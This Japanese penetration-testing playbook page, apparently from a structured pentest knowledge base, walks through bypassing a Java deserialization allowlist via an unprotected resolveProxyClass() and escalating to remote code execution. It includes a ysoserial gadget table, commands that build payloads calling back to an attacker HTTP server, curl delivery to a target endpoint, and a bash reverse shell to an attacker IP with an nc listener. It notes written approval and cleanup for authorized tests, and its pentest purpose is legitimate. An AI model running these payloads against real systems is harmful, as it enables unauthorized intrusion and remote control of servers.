# Java デシリアライズ allowlist バイパス

> **スコープ**: Java オブジェクトのデシリアライズに対して allowlist 防御が実装されている環境での `resolveProxyClass()` バイパス〜ysoserial ガジェットチェーンによる RCE まで扱う。原理 → `../../06_Concepts/Java_Deserialization.md`

## 着火条件

以下が揃った Java アプリケーションを対象にするとき：

- ネットワーク経由で Java オブジェクトのデシリアライズを行っている
- `ObjectInputStream`（またはそのラッパーライブラリ）を使用している
- allowlist（許可クラスリスト）による防御が実装されている
- `resolveClass()` のみが override されており `resolveProxyClass()` が未 override

**着火の優先度**: allowlist が実装されている = 「防御しているつもり」の状態。その前提を崩せると判断した場合に試みる。

## 環境前提

- 実行環境: テスター端末
- 必要なツール:
  - `ysoserial`（Java デシリアライズガジェットチェーン生成ツール。別途インストール要、インターネットアクセス要）
  - `Java`（JDK 8 以上）
  - OOB コールバック: Burp Collaborator / interactsh / tcpdump
- オフライン代替: ガジェットチェーンをバイト列として手動構築（高難度）

## 先に確認すること

- エンドポイントが Java デシリアライズを受け付けているか（バイト列先頭 `AC ED 00 05` = Java シリアライズのマジックバイト / `Content-Type: application/x-java-serialized-object`）
- allowlist が実装されているか（通常クラスを送って `ClassNotFoundException` に "not allowed" 等の文言があるか）
- **ガジェットライブラリのクラスパス確認はほぼ不可能**: URLDNS ガジェット + DNS コールバックで「デシリアライズが動くか」を先に間接確認するのが定石

**攻撃者の思考トレース:** allowlist で通常クラスが弾かれる = `resolveClass()` は保護されている。では `resolveProxyClass()` は？ Java の仕様上この 2 つは別のコードパス。片方だけ守っても Proxy 形式で送れば通る可能性がある。

---

## 1. エンドポイント確認（Java シリアライズのマジックバイト）

**コマンド:**

```bash
# [Attacker] バイナリ先頭でマジックバイトを確認
hexdump -C [CAPTURED_REQUEST_BODY] | head -3
# 出力例: ac ed 00 05 ... → Java シリアライズデータ
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `ac ed 00 05` | Java シリアライズデータ確定 | §2 allowlist の動作確認へ |
| XML / JSON / YAML フォーマット | 別のデシリアライズ形式 | XStream / Jackson / SnakeYAML 等のセクションへ（このファイルの範囲外）|

---

## 2. allowlist の動作確認（対照実験）

通常クラスのシリアライズデータを送り、エラーメッセージを確認する。

**観測される出力 → 次のアクション:**

| シグナル | 次のアクション |
|---|---|
| 通常クラス送信 → `not in accept list` / `not allowed` 等のエラー | allowlist が動作確認 → §3 Proxy バイパスを試みる |
| 通常クラスが素通りする | allowlist が未実装 → 通常のデシリアライズ攻撃が直接使える（§4 へ）|

---

## 3. Proxy バイパスの試行

Java の `Proxy.newProxyInstance()` を使い、allowlist 外のインターフェースを持つ Proxy オブジェクトをシリアライズしてエンドポイントに送信する。

**コマンド（Java コード例）:**

```java
// [Attacker] Proxy オブジェクトの生成イメージ
Object proxy = Proxy.newProxyInstance(
    classLoader,
    new Class[]{[NON_ALLOWLISTED_INTERFACE]},
    handler
);
// シリアライズして送信
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 通常クラスは弾かれるが Proxy が素通り | allowlist バイパス確認（`resolveProxyClass()` 未保護）| §4 ガジェットチェーンへ進む |
| Proxy 送信 → `not allowed` と同じメッセージ | `resolveProxyClass()` も保護済み | この手法は使えない → §刺さらなかったとき |
| エラーなし / デシリアライズ成功 | バイパス確認 | §4 へ |

---

## 4. ガジェットチェーンで RCE

**ysoserial 代表ガジェット早見表（クラスパス未確認時の試行優先順）:**

| 優先 | ガジェット名 | 必要ライブラリ | 用途 |
|---|---|---|---|
| **1（最優先）** | `URLDNS` | JDK 標準のみ（追加 jar 不要）| DNS コールバック確認 — デシリアライズが「動くか」を外部依存なしで確認 |
| 2 | `CommonsCollections1` | Commons Collections 3.1 | RCE（CC 3.1 用）|
| 3 | `CommonsCollections6` | Commons Collections 3.1 / 3.2 / 4.x | RCE（Java 8+ 全域対応版・CC1 が刺さらない場合）|
| 4 | `CommonsBeanutils1` | Commons BeanUtils 1.x | RCE（BeanUtils が入っている Spring / Struts 環境）|
| 5 | `Spring1` / `Spring2` | Spring Framework | RCE（Spring 系アプリ向け）|
| 6 | `Hibernate1` | Hibernate ORM | RCE（Hibernate 利用の JPA アプリ向け）|
| 7 | `Jdk7u21` | JDK 7u21 以下 + JDK 8 初期 | RCE（パッチ前 JDK 固有）|
| 8 | `CommonsCollections2/3/4/5/7` | CC 4.0 系 | RCE（バージョン別）|

**コマンド:**

```bash
# [Attacker] Step 1: URLDNS ガジェット生成（DNS コールバックで到達確認）
# 外部 jar 依存なし・クラスパスに何もなくても動く・副作用が DNS クエリのみ
java -jar ysoserial.jar URLDNS "http://[COLLAB_SUBDOMAIN].burpcollaborator.net" > urldns_payload.bin

# [Attacker] Step 2: ペイロードをエンドポイントへ送信
curl -X POST http://[TARGET]/[ENDPOINT] \
  --data-binary @urldns_payload.bin \
  -H "Content-Type: application/x-java-serialized-object"

# [Attacker] Step 3: DNS コールバック到達を観測
# tcpdump で DNS コールバックを受信
tcpdump -i [INTERFACE] port 53

# [Attacker] Step 4: DNS コールバック確認後、RCE 系ガジェットに切替（CommonsCollections1 から試す）
java -jar ysoserial.jar CommonsCollections1 "curl http://[ATTACKER_HTTP_SERVER]/cc1-check" > cc1_payload.bin
java -jar ysoserial.jar CommonsCollections6 "curl http://[ATTACKER_HTTP_SERVER]/cc6-check" > cc6_payload.bin

# [Attacker] RCE 確定後（リバースシェル）
java -jar ysoserial.jar [GADGET_NAME] "bash -c 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1'" > payload.bin
```

**リバースシェル受信:**

```bash
# [Attacker]
nc -lvnp 4444
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| Burp Collaborator / tcpdump に DNS クエリが届く | デシリアライズが実行された確認 | RCE 系ガジェット（CC1 / CC6 等）に切替 |
| RCE 系ガジェットで HTTP コールバックが届く | クラスパスにガジェットライブラリあり | リバースシェルペイロードへ切替 |
| DNS コールバックが来ない | エンドポイントまで届いていない / 外部 DNS 遮断 / allowlist で弾かれている | 経路を見直す / interactsh でリトライ |

> コールバック受信の詳細 → `../../06_Concepts/Reverse_Shell.md`（攻撃側の準備①②）

---

## 刺さらなかったとき（全体）

| 条件不成立のシグナル | 判断と次の手 |
|---|---|
| Proxy 送信も `resolveProxyClass()` でブロックされる | 両経路が保護済み → この手法は使えない |
| ガジェットライブラリがクラスパスにない | URLDNS は確認できても RCE に繋がらない → SSRF / 情報漏洩系の影響評価に切り替える |
| エンドポイントがバイト列を受け付けない | プロトコルが違う（XML / JSON / YAML 等）→ XStream / Jackson / SnakeYAML 等の別系統 |
| RCE 系ガジェット全て失敗 / URLDNS はコールバック来るが RCE に繋がらない | クラスパスにガジェットライブラリなし / `jdk.serialFilter` で実行ブロック | JNDI / RMI フォールバック / 影響スコープを「到達確認（URLDNS 成立）」として reporting に留める |

---

## 注意点・落とし穴

- **ガジェットのバージョン依存**: Commons Collections 3.x 向けと 4.x 向けは別ペイロード
- **Java バージョン制限**: `jdk.serialFilter`（JEP 290）は JDK 9 で導入・JDK 8u121 にバックポート。エラーが `InvalidClassException` / `filter status: REJECTED` なら有効化されていると判断
- **allowlist の確認が先**: allowlist がない環境ではこのバイパスを考える前に通常のデシリアライズ攻撃が直接使える

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）
- **想定される SIEM/EDR 検知**: デシリアライズ経由の `Runtime.exec()` 呼び出し、異常プロセス生成
- **業務影響リスク**: ガジェットチェーンの種類によってはサービス停止の可能性あり
- **原状回復必須項目**: ✅ テスト中に生成したプロセス・ファイルの削除
- **取得情報の取扱**: 暗号化保管 / テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：Web エンドポイント列挙・バイト列の確認 → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：原理の理解 → `../../06_Concepts/Java_Deserialization.md`
- 後：RCE 取得後の次の手 → `../../03_Post_Access_Linux/Enumeration_Checklist.md`
